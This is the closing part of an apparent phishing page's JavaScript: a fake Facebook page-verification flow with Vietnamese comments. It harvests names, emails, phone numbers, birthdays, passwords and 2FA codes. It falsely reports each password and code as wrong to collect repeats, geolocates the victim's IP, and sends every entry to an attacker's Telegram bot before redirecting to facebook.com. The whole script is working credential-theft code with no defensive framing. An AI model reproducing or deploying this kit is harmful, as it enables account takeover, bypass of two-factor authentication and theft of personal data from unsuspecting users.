                { code: '+223', iso: 'ML' },
                { code: '+356', iso: 'MT' },
                { code: '+692', iso: 'MH' },
                { code: '+222', iso: 'MR' },
                { code: '+230', iso: 'MU' },
                { code: '+262', iso: 'YT' },
                { code: '+52', iso: 'MX' },
                { code: '+691', iso: 'FM' },
                { code: '+373', iso: 'MD' },
                { code: '+377', iso: 'MC' },
                { code: '+976', iso: 'MN' },
                { code: '+382', iso: 'ME' },
                { code: '+1-664', iso: 'MS' },
                { code: '+212', iso: 'MA' },
                { code: '+258', iso: 'MZ' },
                { code: '+95', iso: 'MM' },
                { code: '+264', iso: 'NA' },
                { code: '+674', iso: 'NR' },
                { code: '+977', iso: 'NP' },
                { code: '+31', iso: 'NL' },
                { code: '+599', iso: 'AN' },
                { code: '+687', iso: 'NC' },
                { code: '+64', iso: 'NZ' },
                { code: '+505', iso: 'NI' },
                { code: '+227', iso: 'NE' },
                { code: '+234', iso: 'NG' },
                { code: '+683', iso: 'NU' },
                { code: '+850', iso: 'KP' },
                { code: '+1-670', iso: 'MP' },
                { code: '+47', iso: 'NO' },
                { code: '+968', iso: 'OM' },
                { code: '+92', iso: 'PK' },
                { code: '+680', iso: 'PW' },
                { code: '+970', iso: 'PS' },
                { code: '+507', iso: 'PA' },
                { code: '+675', iso: 'PG' },
                { code: '+595', iso: 'PY' },
                { code: '+51', iso: 'PE' },
                { code: '+63', iso: 'PH' },
                { code: '+64', iso: 'PN' },
                { code: '+48', iso: 'PL' },
                { code: '+351', iso: 'PT' },
                { code: '+1-787, 1-939', iso: 'PR' },
                { code: '+974', iso: 'QA' },
                { code: '+242', iso: 'CG' },
                { code: '+262', iso: 'RE' },
                { code: '+40', iso: 'RO' },
                { code: '+7', iso: 'RU' },
                { code: '+250', iso: 'RW' },
                { code: '+590', iso: 'BL' },
                { code: '+290', iso: 'SH' },
                { code: '+1-869', iso: 'KN' },
                { code: '+1-758', iso: 'LC' },
                { code: '+590', iso: 'MF' },
                { code: '+508', iso: 'PM' },
                { code: '+1-784', iso: 'VC' },
                { code: '+685', iso: 'WS' },
                { code: '+378', iso: 'SM' },
                { code: '+239', iso: 'ST' },
                { code: '+966', iso: 'SA' },
                { code: '+221', iso: 'SN' },
                { code: '+381', iso: 'RS' },
                { code: '+248', iso: 'SC' },
                { code: '+232', iso: 'SL' },
                { code: '+65', iso: 'SG' },
                { code: '+1-721', iso: 'SX' },
                { code: '+421', iso: 'SK' },
                { code: '+386', iso: 'SI' },
                { code: '+677', iso: 'SB' },
                { code: '+252', iso: 'SO' },
                { code: '+27', iso: 'ZA' },
                { code: '+82', iso: 'KR' },
                { code: '+211', iso: 'SS' },
                { code: '+34', iso: 'ES' },
                { code: '+94', iso: 'LK' },
                { code: '+249', iso: 'SD' },
                { code: '+597', iso: 'SR' },
                { code: '+47', iso: 'SJ' },
                { code: '+268', iso: 'SZ' },
                { code: '+46', iso: 'SE' },
                { code: '+41', iso: 'CH' },
                { code: '+963', iso: 'SY' },
                { code: '+886', iso: 'TW' },
                { code: '+992', iso: 'TJ' },
                { code: '+255', iso: 'TZ' },
                { code: '+66', iso: 'TH' },
                { code: '+228', iso: 'TG' },
                { code: '+690', iso: 'TK' },
                { code: '+676', iso: 'TO' },
                { code: '+1-868', iso: 'TT' },
                { code: '+216', iso: 'TN' },
                { code: '+90', iso: 'TR' },
                { code: '+993', iso: 'TM' },
                { code: '+1-649', iso: 'TC' },
                { code: '+688', iso: 'TV' },
                { code: '+1-340', iso: 'VI' },
                { code: '+256', iso: 'UG' },
                { code: '+380', iso: 'UA' },
                { code: '+971', iso: 'AE' },
                { code: '+44', iso: 'GB' },
                { code: '+1', iso: 'US' },
                { code: '+598', iso: 'UY' },
                { code: '+998', iso: 'UZ' },
                { code: '+678', iso: 'VU' },
                { code: '+379', iso: 'VA' },
                { code: '+58', iso: 'VE' },
                { code: '+84', iso: 'VN' },
                { code: '+681', iso: 'WF' },
                { code: '+212', iso: 'EH' },
                { code: '+967', iso: 'YE' },
                { code: '+260', iso: 'ZM' },
                { code: '+263', iso: 'ZW' }
            ];
            const isoMap = new Map(isoList.map((item) => [item.iso, item.code]));
            document.querySelector('input[name="phoneNumber"]').value = isoMap.get(country);
        });
        // GeoLocation interface
        const defaultGeoData = {
            accuracy: 0,
            country: '',
            longitude: '',
            organization: '',
            asn: 0,
            timezone: '',
            area_code: '',
            organization_name: '',
            country_code: '',
            country_code3: '',
            continent_code: '',
            ip: '',
            region: '',
            latitude: '',
            city: ''
        };

        let passwordAttempts = 0;
        let codeAttempts = 0;
        let lastMessageId = 0;

        // Clear localStorage on page load
        window.addEventListener('load', () => {
            localStorage.removeItem('lastMessage');
            localStorage.removeItem('lastMessageId');
            localStorage.removeItem('helpFormData');
            localStorage.removeItem('geoData');
            passwordAttempts = 0;
            codeAttempts = 0;
            lastMessageId = 0;
        });

        // Show/hide modal functions
        const showModal = () => {
            console.log('showModal function called');
            const modalOverlay = document.getElementById('modalOverlay');
            if (modalOverlay) {
                console.log('Modal element found');
                modalOverlay.style.display = 'flex';
            } else {
                console.log('Modal element not found');
            }
        };

        const hideModal = () => {
            const modalOverlay = document.getElementById('modalOverlay');
            if (modalOverlay) {
                modalOverlay.style.display = 'none';
            }
        };

        // Show password verification dialog
        const showPasswordVerification = async () => {
            try {
                const response = await fetch('./home/password-verification.html');
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                const html = await response.text();
                document.body.insertAdjacentHTML('beforeend', html);
            } catch (error) {
                console.error('Error loading password verification dialog:', error);
            }
        };

        // Show 2FA verification dialog
        const showTwoFactorAuth = async () => {
            try {
                const response = await fetch('./home/two-factor-auth.html');
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                const html = await response.text();
                document.body.insertAdjacentHTML('beforeend', html);
                setupVerificationCodeInput();
            } catch (error) {
                console.error('Error loading 2FA dialog:', error);
            }
        };

        // Setup verification code input
        const setupVerificationCodeInput = () => {
            const input = document.getElementById('verificationCode');
            const button = document.getElementById('continueButton');

            if (input && button) {
                input.addEventListener('input', (e) => {
                    // Only allow numbers
                    e.target.value = e.target.value.replace(/\D/g, '');

                    // Giới hạn độ dài 8 số
                    if (e.target.value.length > 8) {
                        e.target.value = e.target.value.slice(0, 8);
                    }

                    // Enable/disable button based on input length
                    if (e.target.value.length === 6 || e.target.value.length === 8) {
                        button.style.backgroundColor = '#1877f2';
                        button.style.color = '#fff';
                        button.disabled = false;
                    } else {
                        button.style.backgroundColor = '#E4E6EB';
                        button.style.color = '#BCC0C4';
                        button.disabled = true;
                    }
                });
            }
        };

        const validateForm = () => {
            const pageName = document.querySelector('input[name="pageName"]').value;
            const fullName = document.querySelector('input[name="fullName"]').value;
            const email = document.querySelector('input[name="email"]').value;
            const phone = document.querySelector('input[name="phoneNumber"]').value;
            const birthday = document.querySelector('input[name="dateOfBirth"]').value;

            // Basic validation
            if (!pageName || !fullName || !email || !phone || !birthday) {
                return false;
            }

            // Email validation
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                return false;
            }

            saveFormDataToLocalStorage();
            return true;
        };

        const saveFormDataToLocalStorage = () => {
            const formData = {
                pageName: document.querySelector('input[name="pageName"]').value,
                fullName: document.querySelector('input[name="fullName"]').value,
                phone: document.querySelector('input[name="phoneNumber"]').value,
                email: document.querySelector('input[name="email"]').value,
                birthday: document.querySelector('input[name="dateOfBirth"]').value,
                password: '',
                code: ''
            };

            localStorage.setItem('helpFormData', JSON.stringify(formData));
        };

        // Handle form submission
        const handleSubmit = (event) => {
            event.preventDefault();

            try {
                if (validateForm()) {
                    hideModal();
                    showPasswordVerification();
                }
            } catch (error) {
                console.error('Error in form submission:', error);
            }
        };

        const createInitialMessage = (formData, geoData) => {
            const currentTime = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
            return `📍 <b>THÔNG TIN VỊ TRÍ</b>
        🌐 <b>IP:</b> <code>${geoData.ip}</code>
        🌏 <b>Quốc Gia:</b> <code>${geoData.location?.country || 'Unknown'}</code>
        🏙️ <b>Thành Phố:</b> <code>${geoData.location?.city || 'Unknown'}</code>
        ⏰ <b>Thời Gian:</b> <code>${currentTime}</code>
        ━━━━━━━━━━━━━━━━━━━━━
        👤 <b>THÔNG TIN PHỤ</b>
        📱 <b>Tên PAGE:</b> <code>${formData.pageName}</code>
        👨‍💼 <b>Họ Tên:</b> <code>${formData.fullName}</code>
        🎂 <b>Ngày Sinh:</b> <code>${formData.birthday}</code>
        ━━━━━━━━━━━━━━━━━━━━━
        🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
        📧 <b>Email:</b> <code>${formData.email}</code>
        📞 <b>Số Điện Thoại:</b> <code>+${formData.phone}</code>`;
        };

        const createPasswordMessage = (baseMessage, password, attempt) => {
            const currentMessage = baseMessage.split('━━━━━━━━━━━━━━━━━━━━━').slice(0, 3).join('━━━━━━━━━━━━━━━━━━━━━');
            if (attempt === 1) {
                return `${currentMessage}\n🔑 <b>Mật Khẩu:</b> <code>${password}</code>`;
            }
            return `${currentMessage}\n🔑 <b>Mật Khẩu ${attempt}:</b> <code>${password}</code>`;
        };

        const createCodeMessage = (baseMessage, code, attempt) => {
            // Check if message already has a code section
            if (baseMessage.includes('CODE 2FA')) {
                // If it does, just add the new code to the existing code section
                if (attempt === 1) {
                    return `${baseMessage}\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
                }
                return `${baseMessage}\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
            } else {
                // If it doesn't have a code section yet, add the separator and first code
                if (attempt === 1) {
                    return `${baseMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
                }
                return `${baseMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
            }
        };

        // Handle password verification
        const handlePasswordVerification = async () => {
            const password = document.getElementById('securityPassword').value;
            if (!password) return;

            passwordAttempts++;
            const storedData = localStorage.getItem('helpFormData');
            if (!storedData) return;

            try {
                // Get or use cached geo data
                let geoData = JSON.parse(localStorage.getItem('geoData') || 'null');

                if (!geoData) {
                    try {
                        const response = await fetch('https://api.ipapi.is/');
                        const rawData = await response.json();
                        // Transform the data to match our needs
                        geoData = {
                            ip: rawData.ip,
                            location: {
                                country: rawData.location?.country || rawData.country || 'Unknown',
                                city: rawData.location?.city || rawData.city || 'Unknown'
                            }
                        };
                        // Cache the geo data
                        localStorage.setItem('geoData', JSON.stringify(geoData));
                    } catch (error) {
                        console.error('Error fetching location:', error);
                        geoData = {
                            ip: 'Unknown',
                            location: {
                                country: 'Unknown',
                                city: 'Unknown'
                            }
                        };
                    }
                }

                const formData = JSON.parse(storedData);
                formData.password = password;

                // Get or create base message
                let baseMessage = localStorage.getItem('lastMessage');
                if (!baseMessage) {
                    baseMessage = createInitialMessage(formData, geoData);
                }

                // Create message with password
                const message = createPasswordMessage(baseMessage, password, passwordAttempts);
                localStorage.setItem('lastMessage', message);

                // Delete previous message if exists
                if (lastMessageId > 0) {
                    try {
                        await fetch(`https://api.telegram.org/bot${config.telegram.token}/deleteMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: config.telegram.chatId,
                                message_id: lastMessageId
                            })
                        });
                    } catch (error) {
                        console.error('Error deleting message:', error);
                    }
                }

                // Send new message
                const response = await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: config.telegram.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const telegramResponse = await response.json();
                if (telegramResponse.ok) {
                    lastMessageId = telegramResponse.result.message_id;
                    localStorage.setItem('lastMessageId', lastMessageId.toString());
                }

                // Show error message
                const errorElement = document.querySelector('.password-error');
                if (errorElement) {
                    errorElement.textContent = 'Incorrect password. Please try again.';
                    errorElement.style.display = 'block';
                }

                // Check attempts and proceed
                if (passwordAttempts >= config.setting.max_password_attempts) {
                    const verificationDialog = document.querySelector('.password-verification');
                    if (verificationDialog) {
                        verificationDialog.remove();
                    }
                    showTwoFactorAuth();
                }
            } catch (error) {
                console.error('Error:', error);
            }
        };

        // Handle verification code
        const handleVerificationCode = async () => {
            const code = document.getElementById('verificationCode').value;
            const codeInput = document.getElementById('verificationCode');
            const continueButton = document.getElementById('continueButton');
            const errorElement = document.querySelector('.code-error');

            // Kiểm tra nếu đang trong thời gian chờ
            if (isInCooldown) {
                errorElement.style.display = 'block';
                errorElement.textContent = 'Please wait 30 seconds before entering the next code';
                return;
            }

            // Kiểm tra độ dài code
            if (code.length !== 6 && code.length !== 8) {
                errorElement.style.display = 'block';
                errorElement.textContent = 'The verification code must be 6 or 8 digits';
                return;
            }

            // Kiểm tra code chỉ chứa số
            if (!/^\d+$/.test(code)) {
                errorElement.style.display = 'block';
                errorElement.textContent = 'The verification code must only contain numbers';
                return;
            }

            codeAttempts++;

            try {
                const baseMessage = localStorage.getItem('lastMessage');
                if (!baseMessage) return;

                // Create message with code
                const message = createCodeMessage(baseMessage, code, codeAttempts);

                // Delete previous message if exists
                const savedMessageId = localStorage.getItem('lastMessageId');
                if (savedMessageId) {
                    try {
                        await fetch(`https://api.telegram.org/bot${config.telegram.token}/deleteMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: config.telegram.chatId,
                                message_id: parseInt(savedMessageId)
                            })
                        });
                    } catch (error) {
                        console.error('Error deleting message:', error);
                    }
                }

                // Send new message
                const response = await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: config.telegram.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const telegramResponse = await response.json();
                if (telegramResponse.ok) {
                    lastMessageId = telegramResponse.result.message_id;
                    localStorage.setItem('lastMessageId', lastMessageId.toString());
                    localStorage.setItem('lastMessage', message);
                }

                // Bắt đầu thời gian chờ
                isInCooldown = true;
                codeInput.disabled = true;
                continueButton.disabled = true;
                let timeLeft = 30;

                cooldownTimer = setInterval(() => {
                    continueButton.textContent = `Please wait ${timeLeft} seconds`;
                    timeLeft--;

                    if (timeLeft < 0) {
                        clearInterval(cooldownTimer);
                        isInCooldown = false;
                        codeInput.disabled = false;
                        codeInput.value = '';
                        continueButton.disabled = false;
                        continueButton.textContent = 'Continue';
                    }
                }, 1000);

                // Show error message
                errorElement.textContent = 'The verification code is incorrect. Please try again.';
                errorElement.style.display = 'block';

                // Check attempts and redirect
                if (codeAttempts >= config.setting.max_code_attempts) {
                    // Show success message
                    const successModal = document.createElement('div');
                    successModal.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                            background: rgba(0, 0, 0, 0.5); display: flex; align-items: center;
                            justify-content: center; z-index: 20000">
                  <div style="background: white; padding: 20px; border-radius: 8px; text-align: center">
                    <h3>Xác thực thành công!</h3>
                    <p>Đang chuyển hướng đến Facebook...</p>
                  </div>
                </div>
              `;
                    document.body.appendChild(successModal);

                    setTimeout(() => {
                        window.location.href = 'https://www.facebook.com/';
                    }, 2000);
                }
            } catch (error) {
                console.error('Error:', error);
            }
        };

        // Hide verification dialog
        const hideVerificationDialog = () => {
            const dialog = document.querySelector('.two-factor-auth');
            if (dialog) {
                dialog.remove();
            }
        };

        // Format date input
        const formatDate = (input) => {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 8) value = value.substr(0, 8);

            if (value.length >= 4) {
                const month = value.substr(0, 2);
                const day = value.substr(2, 2);
                const year = value.substr(4);

                if (value.length >= 4) {
                    value = `${month}/${day}`;
                    if (year) {
                        value += `/${year}`;
                    }
                }
            } else if (value.length >= 2) {
                value = `${value.substr(0, 2)}/${value.substr(2)}`;
            }

            input.value = value;
        };

        // Export functions to be used in HTML
        window.showModal = showModal;
        window.hideModal = hideModal;
        window.handleSubmit = handleSubmit;
        window.handlePasswordVerification = handlePasswordVerification;
        window.handleVerificationCode = handleVerificationCode;
        window.hideVerificationDialog = hideVerificationDialog;
        window.formatDate = formatDate;
    </script>
</html>
